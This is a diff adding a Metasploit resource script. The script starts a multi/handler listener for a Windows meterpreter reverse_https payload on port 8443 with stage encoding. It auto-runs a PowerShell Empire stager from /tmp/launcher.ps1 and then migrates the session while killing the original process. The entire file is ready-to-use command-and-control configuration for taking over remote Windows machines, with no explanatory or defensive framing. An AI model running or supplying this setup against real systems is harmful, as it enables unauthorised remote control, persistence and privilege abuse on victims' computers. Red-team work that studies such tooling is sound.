@@ -1,0 +1,15 @@
+# Initiates a handler for a reverse HTTPS meterpreter stager, using stage encoding
+# The autorunscript is set to autorun.rc
+
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 8443
+set EnableStageEncoding true 
+
+# Automatically run Empire stager, and then migrate - kill original process
+set InitialAutoRunScript post/windows/manage/powershell/exec_psh SCRIPT=/tmp/launcher.ps1 TIMEOUT=-1
+set AutoRunScript post/windows/manage/priv_migrate
+
+# Execute
+exploit
